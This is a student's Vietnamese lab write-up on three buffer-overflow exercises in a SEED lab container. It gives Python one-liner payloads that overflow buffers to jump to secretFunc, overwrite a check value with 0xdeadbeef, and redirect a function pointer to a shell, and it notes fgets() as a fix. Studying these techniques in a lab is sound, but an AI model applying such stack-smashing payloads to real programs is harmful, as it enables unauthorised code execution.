# LAB 1

## File bof1.c

**Chạy docker**
>docker run -it --privileged -v D:\StudyHK1_2024\InformationSecurity\SecLabs:/home/seed/seclabs img4lab

**Lấy địa chỉ hàm secretFunc()**
![alt text](./image/image.png)
**Stack frame**
![alt text](./image/image-1.png)


=> Sẽ bị buffer-overflow qua byte thứ 205

**Chạy chương trình**

 > echo $(python -c "print('a'*204 + '\x6b\x84\x04\x08')") | ./bof1.out

Tận dụng câu lệnh trên để tự động nhập 204 byte là chữ a sau đó chèn địa chỉ của hàm secretFunc vào
![alt text](./image/image-2.png)

=> Xâm nhập thành công

>Để tránh xâm nhập trong trường hợp này mình Replace gets() bằng fget() để lấy đúng giới hạn của mảng a.


## File bof2.c

**Phân tích đề**

>Trường hợp này mảng buf[] có 40 phần tử nhưng lệnh fget() đọc đến 44 phần tử(fget(buf,45,stdin) phần tử cuối để dành cho \0 là kí tự kết thúc chuỗi)

 => chúng ta dựa vào 4 phần tử cuối để thay đổi check

**Stackframe**

![alt text](./image/image-3.png)

**Run**

![alt text](./image/image-5.png)

>echo $(python -c "print('a'*40 + '\xef\xbe\xad\xde')") | ./bof2.out
![alt text](./image/image-6.png)

=> Xâm nhập thành công


## File bof3.c

**Phân tích**

>Trường hợp này mảng buf[] có 128 phần tử nhưng lệnh fget() đọc đến 133 phần tử.

 => chúng ta dựa vào 4 phần tử để thay đôi địa chỉ hàm sup thành địa chỉ hàm shell

**Stack frame**

![alt text](./image/image-7.png)
**Lấy địa chỉ hàm shell**

![alt text](./image/image-8.png)

**Run**

>echo $(python -c "print('a'*128 + '\x5b\x84\x04\x08')") | ./bof3.out
![alt text](./image/image-9.png)

=> Seccessful
